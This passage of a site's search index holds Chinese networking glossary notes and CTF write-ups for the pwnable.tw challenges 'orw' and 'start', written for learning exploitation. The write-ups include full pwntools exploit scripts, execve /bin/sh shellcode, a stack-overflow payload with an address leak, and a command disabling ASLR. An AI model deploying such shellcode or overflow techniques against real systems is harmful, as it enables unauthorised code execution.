OpenVSwitch\u5b9e\u73b0\u4e86\u4e00\u4e2a\u7edf\u4e00\u7684\u67e5\u627e\u7b97\u6cd5\uff1aTSS\uff08Tuple Space Search\uff09\uff0c\u8fd9\u672c\u8d28\u4e0a\u662f\u4e00\u4e2a hash \u67e5\u627e\u7b97\u6cd5 \u3002","title":"\u67e5\u627e\u7b97\u6cd5"},{"location":"Note/SDN/\u6742\u9879/#dpdk","text":"Ovs \u6709\u4f7f\u7528 DPDK \u4f5c\u4e3a\u57fa\u7840\u6765\u5b9e\u73b0\u5305\u7684\u8f6c\u53d1 \u53c2\u8003\u8d44\u6599 https://cloud.tencent.com/developer/article/1198333","title":"DPDK"},{"location":"Note/SDN/\u6742\u9879/#_2","text":"","title":"\u540d\u8bcd"},{"location":"Note/SDN/\u6742\u9879/#_3","text":"Q-router \u5206\u5e03\u5f0f\u8def\u7531DVR \uff0cqr\u662f Q-router\u7684\u7f51\u5173\u53e3\uff0c\u6bcf\u4e2a\u5b50\u7f51\u4e00\u4e2a\uff1f Qos router\uff1fQuality of Service Router\uff1f \u5bf9\u6d41\u91cf\u8fdb\u884c\u670d\u52a1\u4f18\u5148\u7ea7\u914d\u7f6e\uff0c\u8fbe\u5230\u9650\u901f\u548c\u4fdd\u8bc1\u9ad8\u4f18\u5148\u7ea7\u522b\u6d41\u91cf\u901a\u8fc7\u62e5\u585e\u8def\u5f84\u4e0a\u7684\u8def\u7531\u8bbe\u5907 V-Router \u7f51\u5173\u53e3\u662f sg qvm port\uff1f TOP TOR top of rack \u4ea4\u6362\u673a\u653e\u5728\u673a\u67b6\u7684\u6700\u4e0a\u9762 SPI","title":"\u7f51\u7edc\u540d\u8bcd"},{"location":"Note/SDN/\u6742\u9879/#_4","text":"FusionCloud \u684c\u9762\u4e91\u89e3\u51b3\u65b9\u6848 FC Fusion Compute FM Fusion Manager FA Fusion Access \u684c\u9762\u7ba1\u7406\u8f6f\u4ef6 F\uff1f Fusion Cube \u878d\u5408\u89e3\u51b3\u65b9\u6848 VNC \u5728\u865a\u62df\u673a\u7f51\u7edc\u4e0d\u901a\u7684\u60c5\u51b5\u4e0b\uff0c\u53ef\u4ee5\u901a\u8fc7VNC\u767b\u5f55\uff0c\u5148\u767b\u5f55\u5230\u865a\u62df\u673a\u6240\u5728\u7684\u5bbf\u4e3b\u673a\uff0c\u518d\u901a\u8fc7\u5185\u90e8\u901a\u9053\u8bbf\u95ee\u81f3\u4e3b\u673a \u6211\u5f88\u597d\u5947\u8fd9\u4e48\u591a\u53e3\u662f\u7528\u6765\u5e72\u561b\u7684\u3002\u3002\u3002","title":"\u534e\u4e3a\u540d\u8bcd"},{"location":"WriteUp/Pwn Pwnable.tw orw/","text":"0x00 \u5206\u6790 \u9996\u5148\uff0c\u9898\u76ee\u7684\u76ee\u7684\u662f 1 2 3 Read the flag from /home/orw/flag. Only open read write syscall are allowed to use. \u4e5f\u5c31\u662f\u53ea\u80fd\u901a\u8fc7 open \u3001 read \u3001 write \uff0c\u6765\u8bfb\u53d6\u6587\u4ef6 /home/orw/flag ida \u5206\u6790\u4e4b\uff0c\u5373\u4ecestdin\u8bfb\u53d60xc8=200\u4e2a\u5b57\u8282\uff0c\u7136\u540e\u6267\u884c\u8fd9\u6bb5\u4ee3\u7801 ida\u7684f5\u5982\u4e0b 1 2 3 4 5 6 7 8 9 int __cdecl main ( int argc , const char ** argv , const char ** envp ) { orw_seccomp (); printf ( Give my your shellcode: ); read ( 0 , shellcode , 200u ); // ((void (*)(void)) \u8f6c\u6362\u4e3a\u6307\u5411\u51fd\u6570\u7684\u6307\u9488\u7c7b\u4f3c (( void ( * )( void )) shellcode )(); return 0 ; } void(*)(void) \u662f\u51fd\u6570\u6307\u9488\uff0c\u51fd\u6570\u7c7b\u4f3c\u539f\u578b void function(void) 1 2 3 void ( * p )( void ); /*\u5b9a\u4e49\u4e00\u4e2a\u51fd\u6570\u6307\u9488*/ p = ( void ( * )( void )) shellcode ; p (); \u56e0\u6b64\uff0c\u672c\u9898\u7684\u4e3b\u8981\u76ee\u7684\u662f\u6784\u9020shellcode \u4ee5\u4e0b\u662f\u9700\u8981\u6ce8\u610f\u7684\u70b9 \u7cfb\u7edf\u8c03\u7528\u53f7 linux 32\u4f4d\u7684\u5165\u53c2\u987a\u5e8f \u4ece\u53f3\u81f3\u5de6\u4f9d\u6b21\u5165\u6808 linux 64\u4f4d\u53c2\u6570\u4f20\u9012\u662f\u6309\u7167rdi\u3001rsi\u3001rdx\u3001rcx\u3001r8\u3001r9\u7684\u987a\u5e8f\u5b58\u653e\u7b2c\u4e00\u4e2a\u53c2\u6570\u5230\u7b2c\u516d\u4e2a\u53c2\u6570\u3002\u5bf9\u4e8e\u8d85\u51fa6\u4e2a\u53c2\u6570\u7684\u5165\u53c2\u8fd8\u662f\u548c32\u4f4d\u673a\u5668\u4e00\u6837\u653e\u5165\u6808\u4e2d\u3002 linux\u7684\u8fd4\u56de\u503c\u4e00\u822c\u5728\u5bc4\u5b58\u5668eax\u4e2d sys_open 0x01 \u8c03\u8bd5 0x02 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 # coding:utf-8 from pwn import * from pwnlib import * # p = process( ./orw ) p = remote ( chall.pwnable.tw , 10001 ) def gdb_attach ( p ): context . terminal = [ gnome-terminal , -x , sh , -c ] gdb . attach ( proc . pidof ( p )[ 0 ]) push_file_name = shellcraft . i386 . pushstr ( /home/orw/flag ) open_file = shellcraft . i386 . linux . syscall ( SYS_open , esp ) read_file_to_fd = shellcraft . i386 . linux . syscall ( SYS_read , eax , esp , 0x30 ) write_from_fd_to_stdin = shellcraft . i386 . linux . syscall ( SYS_write , 1 , esp , 0x30 ) shellcode = push_file_name + open_file + read_file_to_fd + write_from_fd_to_stdin # shellcode = # shellcode += xor ecx,ecx;mov eax,0x5;push ecx;push 0x67616c66;push 0x2f77726f;push 0x2f656d6f;push 0x682f2f2f;mov ebx,esp; # shellcode += xor edx,edx;int 0x80;mov eax,0x3;mov ecx,ebx;mov ebx,0x3;mov dl,0x30;int 0x80; # shellcode += mov eax,0x4; mov bl,0x1;int 0x80; p . recvuntil ( : ) payload = asm . asm ( shellcode ) # gdb_attach(p) p . send ( payload ) p . interactive ()","title":"Pwn Pwnable.tw orw"},{"location":"WriteUp/Pwn Pwnable.tw orw/#0x00","text":"\u9996\u5148\uff0c\u9898\u76ee\u7684\u76ee\u7684\u662f 1 2 3 Read the flag from /home/orw/flag. Only open read write syscall are allowed to use. \u4e5f\u5c31\u662f\u53ea\u80fd\u901a\u8fc7 open \u3001 read \u3001 write \uff0c\u6765\u8bfb\u53d6\u6587\u4ef6 /home/orw/flag ida \u5206\u6790\u4e4b\uff0c\u5373\u4ecestdin\u8bfb\u53d60xc8=200\u4e2a\u5b57\u8282\uff0c\u7136\u540e\u6267\u884c\u8fd9\u6bb5\u4ee3\u7801 ida\u7684f5\u5982\u4e0b 1 2 3 4 5 6 7 8 9 int __cdecl main ( int argc , const char ** argv , const char ** envp ) { orw_seccomp (); printf ( Give my your shellcode: ); read ( 0 , shellcode , 200u ); // ((void (*)(void)) \u8f6c\u6362\u4e3a\u6307\u5411\u51fd\u6570\u7684\u6307\u9488\u7c7b\u4f3c (( void ( * )( void )) shellcode )(); return 0 ; } void(*)(void) \u662f\u51fd\u6570\u6307\u9488\uff0c\u51fd\u6570\u7c7b\u4f3c\u539f\u578b void function(void) 1 2 3 void ( * p )( void ); /*\u5b9a\u4e49\u4e00\u4e2a\u51fd\u6570\u6307\u9488*/ p = ( void ( * )( void )) shellcode ; p (); \u56e0\u6b64\uff0c\u672c\u9898\u7684\u4e3b\u8981\u76ee\u7684\u662f\u6784\u9020shellcode \u4ee5\u4e0b\u662f\u9700\u8981\u6ce8\u610f\u7684\u70b9 \u7cfb\u7edf\u8c03\u7528\u53f7 linux 32\u4f4d\u7684\u5165\u53c2\u987a\u5e8f \u4ece\u53f3\u81f3\u5de6\u4f9d\u6b21\u5165\u6808 linux 64\u4f4d\u53c2\u6570\u4f20\u9012\u662f\u6309\u7167rdi\u3001rsi\u3001rdx\u3001rcx\u3001r8\u3001r9\u7684\u987a\u5e8f\u5b58\u653e\u7b2c\u4e00\u4e2a\u53c2\u6570\u5230\u7b2c\u516d\u4e2a\u53c2\u6570\u3002\u5bf9\u4e8e\u8d85\u51fa6\u4e2a\u53c2\u6570\u7684\u5165\u53c2\u8fd8\u662f\u548c32\u4f4d\u673a\u5668\u4e00\u6837\u653e\u5165\u6808\u4e2d\u3002 linux\u7684\u8fd4\u56de\u503c\u4e00\u822c\u5728\u5bc4\u5b58\u5668eax\u4e2d sys_open","title":"0x00 \u5206\u6790"},{"location":"WriteUp/Pwn Pwnable.tw orw/#0x01","text":"","title":"0x01 \u8c03\u8bd5"},{"location":"WriteUp/Pwn Pwnable.tw orw/#0x02","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 # coding:utf-8 from pwn import * from pwnlib import * # p = process( ./orw ) p = remote ( chall.pwnable.tw , 10001 ) def gdb_attach ( p ): context . terminal = [ gnome-terminal , -x , sh , -c ] gdb . attach ( proc . pidof ( p )[ 0 ]) push_file_name = shellcraft . i386 . pushstr ( /home/orw/flag ) open_file = shellcraft . i386 . linux . syscall ( SYS_open , esp ) read_file_to_fd = shellcraft . i386 . linux . syscall ( SYS_read , eax , esp , 0x30 ) write_from_fd_to_stdin = shellcraft . i386 . linux . syscall ( SYS_write , 1 , esp , 0x30 ) shellcode = push_file_name + open_file + read_file_to_fd + write_from_fd_to_stdin # shellcode = # shellcode += xor ecx,ecx;mov eax,0x5;push ecx;push 0x67616c66;push 0x2f77726f;push 0x2f656d6f;push 0x682f2f2f;mov ebx,esp; # shellcode += xor edx,edx;int 0x80;mov eax,0x3;mov ecx,ebx;mov ebx,0x3;mov dl,0x30;int 0x80; # shellcode += mov eax,0x4; mov bl,0x1;int 0x80; p . recvuntil ( : ) payload = asm . asm ( shellcode ) # gdb_attach(p) p . send ( payload ) p . interactive ()","title":"0x02"},{"location":"WriteUp/Pwn Pwnable.tw start/","text":"0x00 \u73af\u5883\u51c6\u5907 pwndbg pwntools \u5173\u95ed\u5730\u5740\u968f\u673a\u5316\u4fdd\u62a4\uff08\u65b9\u4fbf\u8c03\u8bd5\uff09 1 sysctl -w kernel.randomize_va_space = 0 0x01 \u5206\u6790 file + checksec \u4e8c\u8fde ida \u5206\u6790 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 .text:08048060 public _start .text:08048060 _start proc near ; DATA XREF: LOAD:08048018\u2191o .text:08048060 push esp .text:08048061 push offset _exit .text:08048066 xor eax, eax .text:08048068 xor ebx, ebx .text:0804806A xor ecx, ecx .text:0804806C xor edx, edx .text:0804806E push :FTC .text:08048073 push eht .text:08048078 push tra .text:0804807D push ts s .text:08048082 push 2774654Ch .text:08048087 mov ecx, esp ; addr .text:08048089 mov dl, 20 ; len .text:0804808B mov bl, 1 ; fd .text:0804808D mov al, 4 .text:0804808F int 80h ; LINUX - sys_write .text:08048091 xor ebx, ebx .text:08048093 mov dl, 3Ch .text:08048095 mov al, 3 .text:08048097 int 80h ; .text:08048099 add esp, 14h .text:0804809C retn \u6839\u636e \u7cfb\u7edf\u8c03\u7528\u53f7 \uff0c\u5f97\u77e5\u5f53eax\u4e3a3\u65f6\uff0c\u6267\u884c sys_read \uff0c\u5728\u52a0\u4e0agdb\u8c03\u8bd5\uff0c\u5f97\u5230\u51fd\u6570\u6d41\u7a0b 1 2 3 4 5 6 7 void_start (){ charbuf [ 20 ] = Let sstarttheCTF : ; // \u4ecebuf\u5f80stdout\u5199\u516520\u5b57\u8282 sys_write ( 1 , buf , 20 ); // \u4ecestdin\u4e2d\u8bfb\u53d660\u5b57\u8282\u5230buf sys_read ( 0 , buf , 60 ); } \u901a\u8fc7 cyclic \u6216\u5176\u4ed6pattern\uff0c\u5f97\u5230\u6ea2\u51fa\u70b9\u4e3a20 \u56e0\u6b64\uff0c\u5f53\u7a0b\u5e8f\u6267\u884c\u5b8c sys_read \u65f6\u5019\uff0c\u5f80 stdin \u5199\u516520bytes\uff0c read \u51fd\u6570\u5f80\u6808\u4e2d\u5199\u5165\u4e8620\u5b57\u8282\uff0c\u7136\u540e\u5373\u8986\u76d6main\u7684\u8fd4\u56de\u5730\u5740 \u8fd4\u56de\u5230 write \u51fd\u6570\u5229\u7528 write \u6cc4\u6f0f\u6808\u4e2dbuf\u7684\u7684\u5730\u5740\uff0c\u7136\u540e\u7ee7\u7eed\u6267\u884c\u5230 _start \u7684\u8fd4\u56de\u5730\u5740 0x02 \u8c03\u8bd5 \u4ece\u6807\u51c6\u8f93\u5165\uff08fd = 0\uff09\u8bfb\u51650x3c\u4e2a\u5b57\u8282\u52300xfffd104\u4e2d\u53bb \u6808\u9876\u6307\u9488\u52a00x14\uff0c\u6808\u7a7a\u95f4\u51cf\u5c11\u4e860x14\u4e2a\u5b57\u8282 ret\u81f3 sys_write \uff0c\u8be5\u51fd\u6570\u5730\u5740\u662f\u4e0d\u53d8\u7684\uff0c\u4e00\u76f4\u4e3a0x08048087 sys_write \u53c2\u6570\u5982\u4e0b\uff0c\u7531\u4e8e\u4e4b\u524d\u7684 mov ecx,esp \uff0c\u6cc4\u9732\u51faecx\u5bc4\u5b58\u5668\u4e2d\u7684esp\u6808\u9876\u5730\u5740\u5b58\u653e\u7684\u503c\u4ee5\u53ca\u4e4b\u540e0x14\u4e2a\u5b57\u8282\uff0c\u5373 1 2 3 4 5 0xffffd120 0x00000001 0xffffd2f8 0x00000000 0xffffd300 \u4ece\u6807\u51c6\u8f93\u5165\uff08fd = 0\uff09\u8bfb\u51650x3c\u4e2a\u5b57\u8282\u52300xfffd11c\u4e2d\u53bb \u7531\u4e4b\u524d\u7684\u4f8b\u5b50\u53ef\u77e5\u8fd4\u56de\u5730\u5740\u8ddd\u79bb$esp\u6808\u9876\u5730\u5740\u670920\u4e2a\u5b57\u8282\uff0c\u7531\u4e8e\u6700\u5c0f\u7684shellcode\u4e5f\u5927\u4e8e20\u5b57\u8282\uff0c\u6240\u4ee5\u4e0d\u80fd\u76f4\u63a5\u653e\u5165leak\u7684\u6808\u7a7a\u95f4\u5730\u5740\u91cc\u3002 \u6240\u4ee5\u53ea\u80fd\u653e\u5728\u6cc4\u9732\u7684\u6808\u7a7a\u95f4\u7684\u540e\u9762\uff0c\u5373leak+20 = 0xffffd120+20 \u7684\u5730\u5740\u5904 \u89c1\u4e0b\u56fe\uff0c\u8fd4\u56de\u5730\u5740\u7684\u5b58\u653e\u7684\u6808\u5730\u5740\u662f0xffffd130\uff0c\u6cc4\u9732\u51fa\u7684\u662f\u5730\u5740\u662f0xffffd120\uff0c\u56e0\u6b64\u9700\u8981\u8ba9\u8fd4\u56de\u5730\u5740\u53d8\u4e3a0xffffd134\uff0c\u800c0xffffd134\u5b58\u653eshellcode\u5c31\u884c\u4e86 0x03 exp 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 # coding:utf-8 from pwn import * p = process ( ./start ) # p=remote( chall.pwnable.tw ,10000) context ( log_level = debug , arch = i386 , os = linux ) gadget = 0x08048087 shellcode = \\x31\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0\\x0b\\xcd\\x80 def gdb_attach ( p ): context . terminal = [ gnome-terminal , -x , sh , -c ] gdb . attach ( proc . pidof ( p )[ 0 ], gdbscript = b *0x8048097 ) def leak (): p . recv () payload = A * 20 + p32 ( gadget ) p . send ( payload ) return u32 ( p . recv ( 4 )) def pwn ( shellcode_addr ): # ret shellcode_addr run_shellcode payload = A * 20 + p32 ( shellcode_addr ) + shellcode p . send ( payload ) p . interactive () gdb_attach ( p ) shellcode_addr = leak () + 20 print Shellcode_addr = + hex ( shellcode_addr ) pwn ( shellcode_addr )","title":"Pwn Pwnable.tw start"},{"location":"WriteUp/Pwn Pwnable.tw start/#0x00","text":"pwndbg pwntools \u5173\u95ed\u5730\u5740\u968f\u673a\u5316\u4fdd\u62a4\uff08\u65b9\u4fbf\u8c03\u8bd5\uff09 1 sysctl -w kernel.randomize_va_space = 0","title":"0x00 \u73af\u5883\u51c6\u5907"},{"location":"WriteUp/Pwn Pwnable.tw start/#0x01","text":"file + checksec \u4e8c\u8fde ida \u5206\u6790 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 .text:08048060 public _start .text:08048060 _start proc near ; DATA XREF: LOAD:08048018\u2191o .text:08048060 push esp .text:08048061 push offset _exit .text:08048066 xor eax, eax .text:08048068 xor ebx, ebx .text:0804806A xor ecx, ecx .text:0804806C xor edx, edx .text:0804806E push :FTC .text:08048073 push eht .text:08048078 push tra .text:0804807D push ts s .text:08048082 push 2774654Ch .text:08048087 mov ecx, esp ; addr .text:08048089 mov dl, 20 ; len .text:0804808B mov bl, 1 ; fd .text:0804808D mov al, 4 .text:0804808F int 80h ; LINUX - sys_write .text:08048091 xor ebx, ebx .text:08048093 mov dl, 3Ch .text:08048095 mov al, 3 .text:08048097 int 80h ; .text:08048099 add esp, 14h .text:0804809C retn \u6839\u636e \u7cfb\u7edf\u8c03\u7528\u53f7 \uff0c\u5f97\u77e5\u5f53eax\u4e3a3\u65f6\uff0c\u6267\u884c sys_read \uff0c\u5728\u52a0\u4e0agdb\u8c03\u8bd5\uff0c\u5f97\u5230\u51fd\u6570\u6d41\u7a0b 1 2 3 4 5 6 7 void_start (){ charbuf [ 20 ] = Let sstarttheCTF : ; // \u4ecebuf\u5f80stdout\u5199\u516520\u5b57\u8282 sys_write ( 1 , buf , 20 ); // \u4ecestdin\u4e2d\u8bfb\u53d660\u5b57\u8282\u5230buf sys_read ( 0 , buf , 60 ); } \u901a\u8fc7 cyclic \u6216\u5176\u4ed6pattern\uff0c\u5f97\u5230\u6ea2\u51fa\u70b9\u4e3a20 \u56e0\u6b64\uff0c\u5f53\u7a0b\u5e8f\u6267\u884c\u5b8c sys_read \u65f6\u5019\uff0c\u5f80 stdin \u5199\u516520bytes\uff0c read \u51fd\u6570\u5f80\u6808\u4e2d\u5199\u5165\u4e8620\u5b57\u8282\uff0c\u7136\u540e\u5373\u8986\u76d6main\u7684\u8fd4\u56de\u5730\u5740 \u8fd4\u56de\u5230 write \u51fd\u6570\u5229\u7528 write \u6cc4\u6f0f\u6808\u4e2dbuf\u7684\u7684\u5730\u5740\uff0c\u7136\u540e\u7ee7\u7eed\u6267\u884c\u5230 _start \u7684\u8fd4\u56de\u5730\u5740","title":"0x01 \u5206\u6790"},{"location":"WriteUp/Pwn Pwnable.tw start/#0x02","text":"\u4ece\u6807\u51c6\u8f93\u5165\uff08fd = 0\uff09\u8bfb\u51650x3c\u4e2a\u5b57\u8282\u52300xfffd104\u4e2d\u53bb \u6808\u9876\u6307\u9488\u52a00x14\uff0c\u6808\u7a7a\u95f4\u51cf\u5c11\u4e860x14\u4e2a\u5b57\u8282 ret\u81f3 sys_write \uff0c\u8be5\u51fd\u6570\u5730\u5740\u662f\u4e0d\u53d8\u7684\uff0c\u4e00\u76f4\u4e3a0x08048087 sys_write \u53c2\u6570\u5982\u4e0b\uff0c\u7531\u4e8e\u4e4b\u524d\u7684 mov ecx,esp \uff0c\u6cc4\u9732\u51faecx\u5bc4\u5b58\u5668\u4e2d\u7684esp\u6808\u9876\u5730\u5740\u5b58\u653e\u7684\u503c\u4ee5\u53ca\u4e4b\u540e0x14\u4e2a\u5b57\u8282\uff0c\u5373 1 2 3 4 5 0xffffd120 0x00000001 0xffffd2f8 0x00000000 0xffffd300 \u4ece\u6807\u51c6\u8f93\u5165\uff08fd = 0\uff09\u8bfb\u51650x3c\u4e2a\u5b57\u8282\u52300xfffd11c\u4e2d\u53bb \u7531\u4e4b\u524d\u7684\u4f8b\u5b50\u53ef\u77e5\u8fd4\u56de\u5730\u5740\u8ddd\u79bb$esp\u6808\u9876\u5730\u5740\u670920\u4e2a\u5b57\u8282\uff0c\u7531\u4e8e\u6700\u5c0f\u7684shellcode\u4e5f\u5927\u4e8e20\u5b57\u8282\uff0c\u6240\u4ee5\u4e0d\u80fd\u76f4\u63a5\u653e\u5165leak\u7684\u6808\u7a7a\u95f4\u5730\u5740\u91cc\u3002 \u6240\u4ee5\u53ea\u80fd\u653e\u5728\u6cc4\u9732\u7684\u6808\u7a7a\u95f4\u7684\u540e\u9762\uff0c\u5373leak+20 = 0xffffd120+20 \u7684\u5730\u5740\u5904 \u89c1\u4e0b\u56fe\uff0c\u8fd4\u56de\u5730\u5740\u7684\u5b58\u653e\u7684\u6808\u5730\u5740\u662f0xffffd130\uff0c\u6cc4\u9732\u51fa\u7684\u662f\u5730\u5740\u662f0xffffd120\uff0c\u56e0\u6b64\u9700\u8981\u8ba9\u8fd4\u56de\u5730\u5740\u53d8\u4e3a0xffffd134\uff0c\u800c0xffffd134\u5b58\u653eshellcode\u5c31\u884c\u4e86","title":"0x02 \u8c03\u8bd5"},{"location":"WriteUp/Pwn Pwnable.tw start/#0x03-exp","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 # coding:utf-8 from pwn import * p = process ( ./start ) # p=remote( chall.pwnable.tw ,10000) context ( log_level = debug , arch = i386 , os = linux ) gadget = 0x08048087 shellcode = \\x31\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0\\x0b\\xcd\\x80 def gdb_attach ( p ): context . terminal = [ gnome-terminal , -x , sh , -c ] gdb . attach ( proc . pidof ( p )[ 0 ], gdbscript = b *0x8048097 ) def leak (): p . recv () payload = A * 20 + p32 ( gadget ) p . send ( payload ) return u32 ( p . recv ( 4 )) def pwn ( shellcode_addr ): # ret shellcode_addr run_shellcode payload = A * 20 + p32 ( shellcode_addr ) + shellcode p . send ( payload ) p . interactive () gdb_attach ( p ) shellcode_addr = leak () + 20 print Shellcode_addr = + hex ( shellcode_addr ) pwn ( shellcode_addr )","title":"0x03 exp"},{"location":"WriteUp/ReadMe/","text":"\u8bb0\u5f55\u4e4b\u524d\u505a\u7684\u4e00\u4e9b\u9898\uff0c \u5fc3\u60c5\u597d\u5c31\u5199","title":"ReadMe"}]}